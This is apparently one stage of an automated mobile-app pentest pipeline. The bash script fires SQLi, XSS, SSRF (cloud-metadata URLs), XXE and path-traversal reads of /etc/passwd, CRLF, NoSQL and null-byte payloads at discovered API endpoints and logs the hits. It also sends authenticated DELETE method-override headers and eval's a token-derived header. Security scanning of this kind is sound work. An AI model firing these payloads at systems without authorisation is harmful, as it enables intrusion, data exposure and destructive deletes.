#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 17_input_validation.sh - Automated input validation testing across discovered APIs
PROFILE_PHASE="17_input_validation"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"

PKG="$(tget apk package_name)"
[ -z "$PKG" ] && { err "No package_name"; exit 1; }

cd "$RUN_DIR" || exit 1
IV_DIR="$RUN_DIR/input_validation"
mkdir -p "$IV_DIR/results"

# ============================================================
# A. Discover Target Endpoints
# ============================================================
info "=== A. Discovering Target Endpoints ==="

ENDPOINTS_FILE="$IV_DIR/target_endpoints.txt"
: > "$ENDPOINTS_FILE"

info "[step-A1/5] Loading endpoints from traffic capture"
[ -f "$RUN_DIR/traffic/api_endpoints.txt" ] && { cat "$RUN_DIR/traffic/api_endpoints.txt" >> "$ENDPOINTS_FILE"; EP_TRAFFIC=$(wc -l < "$RUN_DIR/traffic/api_endpoints.txt" 2>/dev/null || echo 0); info "  Traffic endpoints: $EP_TRAFFIC"; } || info "  No traffic endpoints file"

info "[step-A2/5] Loading endpoints from static URL extraction"
[ -f "$RUN_DIR/static/urls.txt" ] && { grep -E '^https?://' "$RUN_DIR/static/urls.txt" >> "$ENDPOINTS_FILE" || true; info "  Static URLs loaded"; } || info "  No static URLs file"

info "[step-A3/5] Loading endpoints from code analysis (cleartext URLs)"
[ -f "$RUN_DIR/code_analysis/cleartext_urls.txt" ] && { grep -oE 'https?://[a-zA-Z0-9./_?=&-]+' "$RUN_DIR/code_analysis/cleartext_urls.txt" >> "$ENDPOINTS_FILE" || true; info "  Code analysis URLs loaded"; } || info "  No code analysis URLs file"

info "[step-A4/5] Filtering by target API hosts from config"
TARGET_DOMAINS=$(tget api_hosts 2>/dev/null | tr ',' '|')
if [ -n "$TARGET_DOMAINS" ]; then
  grep -E "$TARGET_DOMAINS" "$ENDPOINTS_FILE" | sort -u > "$IV_DIR/tmp.txt" && mv "$IV_DIR/tmp.txt" "$ENDPOINTS_FILE"
  info "  Filtered to target domains: $TARGET_DOMAINS"
fi

info "[step-A5/5] Deduplicating endpoints"
sort -u "$ENDPOINTS_FILE" > "$IV_DIR/tmp.txt" && mv "$IV_DIR/tmp.txt" "$ENDPOINTS_FILE"
EP_COUNT=$(wc -l < "$ENDPOINTS_FILE" 2>/dev/null || echo 0)
info "  Total unique target endpoints: $EP_COUNT"

# ============================================================
# Helper: Send HTTP request
# ============================================================
JWT_FILE="/home/user/tools/apk_pentest/jwt_token.txt"
AUTH_HEADER=""
[ -f "$JWT_FILE" ] && AUTH_HEADER="-H Authorization:Bearer\ $(cat "$JWT_FILE")"

send_req() {
  local method="$1" url="$2" data="$3" out="$4"
  local args=(-s -o "$out" -w '%{http_code}' --max-time 15)
  case "$method" in
    POST) args+=(-X POST -H "Content-Type: application/json") ;;
    PUT) args+=(-X PUT -H "Content-Type: application/json") ;;
    DELETE) args+=(-X DELETE) ;;
    PATCH) args+=(-X PATCH -H "Content-Type: application/json") ;;
  esac
  [ -n "$AUTH_HEADER" ] && eval "args+=($AUTH_HEADER)"
  [ -n "$data" ] && args+=(-d "$data")
  curl "${args[@]}" "$url" 2>/dev/null
}

# ============================================================
# B. SQL Injection
# ============================================================
info "=== B. SQL Injection Testing ==="
SQLI_OUT="$IV_DIR/results/sqli.txt"; : > "$SQLI_OUT"

info "[step-B1/2] Defining SQLi payloads (error-based, time-based, UNION, comment)"
SQLI_PAYLOADS=("' OR '1'='1" "' OR '1'='1' --" "1' UNION SELECT NULL--" "1; WAITFOR DELAY '0:0:5'--" "1' AND SLEEP(5)--" "admin'--")
info "  Payloads: ${#SQLI_PAYLOADS[@]}"

info "[step-B2/2] Testing $EP_COUNT endpoints for SQL injection"
SQLI_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  for pl in "${SQLI_PAYLOADS[@]}"; do
    enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$pl'))" 2>/dev/null || echo "$pl")
    code=$(send_req GET "${ep}?q=${enc}" "" "$IV_DIR/results/r.txt")
    body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
    if echo "$body" | grep -qiE 'sql.*error|mysql|ORA-|syntax.*error|sqlite.*error|unclosed.*quote'; then
      echo "[SQLi-ERROR] $ep | payload=$pl | code=$code" >> "$SQLI_OUT"
      fadd "SQL injection error-based: $ep" HIGH MEDIUM CWE-89 "A03:2021" "$SQLI_OUT"
      SQLI_HITS=$((SQLI_HITS + 1))
      break
    fi
    if echo "$pl" | grep -qiE 'sleep|waitfor'; then
      t1=$(date +%s%N 2>/dev/null); send_req GET "${ep}?q=${enc}" "" /dev/null; t2=$(date +%s%N 2>/dev/null)
      ms=$(( (t2 - t1) / 1000000 ))
      if [ "$ms" -gt 4000 ]; then
        echo "[SQLi-TIME] $ep | payload=$pl | ${ms}ms" >> "$SQLI_OUT"
        fadd "SQL injection time-based: $ep (${ms}ms)" HIGH MEDIUM CWE-89 "A03:2021" "$SQLI_OUT"
        SQLI_HITS=$((SQLI_HITS + 1))
        break
      fi
    fi
  done
done < "$ENDPOINTS_FILE"
info "  SQLi hits: $SQLI_HITS"

# ============================================================
# C. XSS
# ============================================================
info "=== C. XSS Testing ==="
XSS_OUT="$IV_DIR/results/xss.txt"; : > "$XSS_OUT"

info "[step-C1/2] Defining XSS payloads (reflected, DOM-based)"
XSS_PAYLOADS=('<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '{{7*7}}' '${7*7}')
info "  Payloads: ${#XSS_PAYLOADS[@]}"

info "[step-C2/2] Testing $EP_COUNT endpoints for XSS"
XSS_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  for pl in "${XSS_PAYLOADS[@]}"; do
    enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$pl'''))" 2>/dev/null || echo "$pl")
    code=$(send_req GET "${ep}?q=${enc}" "" "$IV_DIR/results/r.txt")
    body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
    if echo "$body" | grep -qF "$pl"; then
      echo "[XSS] $ep | payload=$pl | code=$code" >> "$XSS_OUT"
      fadd "Reflected XSS: $ep" HIGH MEDIUM CWE-79 "A03:2021" "$XSS_OUT"
      XSS_HITS=$((XSS_HITS + 1))
      break
    fi
  done
done < "$ENDPOINTS_FILE"
info "  XSS hits: $XSS_HITS"

# ============================================================
# D. SSRF
# ============================================================
info "=== D. SSRF Testing ==="
SSRF_OUT="$IV_DIR/results/ssrf.txt"; : > "$SSRF_OUT"

info "[step-D1/2] Defining SSRF payloads (cloud metadata, localhost, GCP metadata)"
SSRF_PAYLOADS=("http://169.254.169.254/latest/meta-data/" "http://127.0.0.1:8080" "http://metadata.google.internal/computeMetadata/v1/")
info "  Payloads: ${#SSRF_PAYLOADS[@]}"

info "[step-D2/2] Testing $EP_COUNT endpoints for SSRF (GET + POST)"
SSRF_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  for pl in "${SSRF_PAYLOADS[@]}"; do
    # GET-based SSRF
    code=$(send_req GET "${ep}?url=${pl}" "" "$IV_DIR/results/r.txt")
    body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
    if echo "$body" | grep -qiE 'ami-id|instance-id|meta-data|cloud.*metadata'; then
      echo "[SSRF-GET] $ep | payload=$pl | code=$code" >> "$SSRF_OUT"
      fadd "SSRF to cloud metadata (GET): $ep" CRITICAL HIGH CWE-918 "A10:2021" "$SSRF_OUT"
      SSRF_HITS=$((SSRF_HITS + 1))
      break
    fi
    # POST-based SSRF
    code=$(send_req POST "$ep" "{\"url\":\"$pl\"}" "$IV_DIR/results/r.txt")
    body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
    if echo "$body" | grep -qiE 'ami-id|instance-id|meta-data'; then
      echo "[SSRF-POST] $ep | payload=$pl | code=$code" >> "$SSRF_OUT"
      fadd "SSRF via POST: $ep" CRITICAL HIGH CWE-918 "A10:2021" "$SSRF_OUT"
      SSRF_HITS=$((SSRF_HITS + 1))
      break
    fi
  done
done < "$ENDPOINTS_FILE"
info "  SSRF hits: $SSRF_HITS"

# ============================================================
# E. XXE
# ============================================================
info "=== E. XXE Testing ==="
XXE_OUT="$IV_DIR/results/xxe.txt"; : > "$XXE_OUT"

info "[step-E1/2] Defining XXE payload (file:///etc/passwd read)"
XXE_PL='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
info "  Payload: XML entity injection → /etc/passwd"

info "[step-E2/2] Testing $EP_COUNT endpoints for XXE"
XXE_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  code=$(send_req POST "$ep" "$XXE_PL" "$IV_DIR/results/r.txt")
  body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
  if echo "$body" | grep -q 'root:'; then
    echo "[XXE] $ep | code=$code" >> "$XXE_OUT"
    fadd "XXE file disclosure: $ep" CRITICAL HIGH CWE-611 "A05:2021" "$XXE_OUT"
    XXE_HITS=$((XXE_HITS + 1))
  fi
done < "$ENDPOINTS_FILE"
info "  XXE hits: $XXE_HITS"

# ============================================================
# F. Path Traversal
# ============================================================
info "=== F. Path Traversal Testing ==="
LFI_OUT="$IV_DIR/results/lfi.txt"; : > "$LFI_OUT"

info "[step-F1/2] Defining LFI payloads (directory traversal, double-encoding)"
LFI_PAYLOADS=("../../../../etc/passwd" "%2e%2e%2f%2e%2e%2fetc/passwd" "..%252f..%252fetc/passwd")
info "  Payloads: ${#LFI_PAYLOADS[@]}"

info "[step-F2/2] Testing $EP_COUNT endpoints for path traversal"
LFI_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  for pl in "${LFI_PAYLOADS[@]}"; do
    code=$(send_req GET "${ep}?file=${pl}" "" "$IV_DIR/results/r.txt")
    body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
    if echo "$body" | grep -q 'root:'; then
      echo "[LFI] $ep | payload=$pl | code=$code" >> "$LFI_OUT"
      fadd "Path traversal / LFI: $ep" HIGH HIGH CWE-22 "A01:2021" "$LFI_OUT"
      LFI_HITS=$((LFI_HITS + 1))
      break
    fi
  done
done < "$ENDPOINTS_FILE"
info "  LFI hits: $LFI_HITS"

# ============================================================
# G. CRLF Injection
# ============================================================
info "=== G. CRLF Injection Testing ==="
CRLF_OUT="$IV_DIR/results/crlf.txt"; : > "$CRLF_OUT"

info "[step-G1/2] Testing CRLF injection (%0d%0a in query params)"
CRLF_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  code=$(curl -s -o "$IV_DIR/results/r.txt" -D "$IV_DIR/results/h.txt" -w '%{http_code}' --max-time 10 \
    -H "Authorization: Bearer $(cat /tmp/jwt_token.txt 2>/dev/null)" \
    "${ep}?q=test%0d%0aInjected-Header:true" 2>/dev/null)
  if grep -qi 'Injected-Header' "$IV_DIR/results/h.txt" 2>/dev/null; then
    echo "[CRLF] $ep | code=$code" >> "$CRLF_OUT"
    fadd "CRLF header injection: $ep" MEDIUM MEDIUM CWE-113 "A03:2021" "$CRLF_OUT"
    CRLF_HITS=$((CRLF_HITS + 1))
  fi
done < "$ENDPOINTS_FILE"
info "  CRLF hits: $CRLF_HITS"

info "[step-G2/2] CRLF injection complete"

# ============================================================
# H. HTTP Method Override
# ============================================================
info "=== H. HTTP Method Override Testing ==="
MTH_OUT="$IV_DIR/results/method_override.txt"; : > "$MTH_OUT"

info "[step-H1/2] Testing X-HTTP-Method-Override / X-Method-Override headers"
MTH_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  for hdr in "X-HTTP-Method-Override:DELETE" "X-Method-Override:DELETE"; do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
      -H "Authorization: Bearer $(cat /tmp/jwt_token.txt 2>/dev/null)" \
      -H "$hdr" "$ep" 2>/dev/null)
    if [ "$code" = "200" ] || [ "$code" = "204" ]; then
      echo "[METHOD-OVERRIDE] $ep | header=$hdr | code=$code" >> "$MTH_OUT"
      fadd "HTTP method override accepted: $ep" MEDIUM MEDIUM CWE-749 "A04:2021" "$MTH_OUT"
      MTH_HITS=$((MTH_HITS + 1))
      break
    fi
  done
done < "$ENDPOINTS_FILE"
info "  Method override hits: $MTH_HITS"

info "[step-H2/2] HTTP method override testing complete"

# ============================================================
# I. NoSQL Injection
# ============================================================
info "=== I. NoSQL Injection Testing ==="
NOSQL_OUT="$IV_DIR/results/nosql.txt"; : > "$NOSQL_OUT"

info "[step-I1/2] Defining NoSQL payloads ($gt, $ne, $regex operators)"
NOSQL_PAYLOADS=("{\"\\$gt\":\"\"}" "{\"\\$ne\":\"\"}" "{\"\\$regex\":\".*\"}")
info "  Payloads: ${#NOSQL_PAYLOADS[@]}"

info "[step-I2/2] Testing $EP_COUNT endpoints for NoSQL injection"
NOSQL_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  for pl in "${NOSQL_PAYLOADS[@]}"; do
    code=$(send_req POST "$ep" "$pl" "$IV_DIR/results/r.txt")
    body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
    if echo "$body" | grep -qiE 'MongoError|MongoDB|bson|CastError'; then
      echo "[NOSQL] $ep | payload=$pl | code=$code" >> "$NOSQL_OUT"
      fadd "NoSQL injection: $ep" HIGH HIGH CWE-943 "A03:2021" "$NOSQL_OUT"
      NOSQL_HITS=$((NOSQL_HITS + 1))
      break
    fi
  done
done < "$ENDPOINTS_FILE"
info "  NoSQL hits: $NOSQL_HITS"

# ============================================================
# J. Null Byte Injection
# ============================================================
info "=== J. Null Byte Injection Testing ==="
NULL_OUT="$IV_DIR/results/nullbyte.txt"; : > "$NULL_OUT"

info "[step-J1/2] Testing null byte injection (%00 in query params)"
NULL_HITS=0
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  echo "$ep" | grep -qE '^https?://' || continue
  code=$(send_req GET "${ep}?q=test%00admin" "" "$IV_DIR/results/r.txt")
  body=$(cat "$IV_DIR/results/r.txt" 2>/dev/null)
  if echo "$body" | grep -qiE 'admin|privileged|unauthorized'; then
    echo "[NULLBYTE] $ep | code=$code" >> "$NULL_OUT"
    fadd "Null byte injection: $ep" MEDIUM MEDIUM CWE-159 "A03:2021" "$NULL_OUT"
    NULL_HITS=$((NULL_HITS + 1))
  fi
done < "$ENDPOINTS_FILE"
info "  Null byte hits: $NULL_HITS"

info "[step-J2/2] Null byte injection complete"

# ============================================================
# Summary
# ============================================================
info "=== Input Validation Summary ==="
info "  SQLi: $SQLI_HITS | XSS: $XSS_HITS | SSRF: $SSRF_HITS | XXE: $XXE_HITS"
info "  LFI: $LFI_HITS | CRLF: $CRLF_HITS | Method Override: $MTH_HITS"
info "  NoSQL: $NOSQL_HITS | Null Byte: $NULL_HITS"
info "  Total endpoints tested: $EP_COUNT"

ok "Input validation complete -> $IV_DIR"
fsnapshot
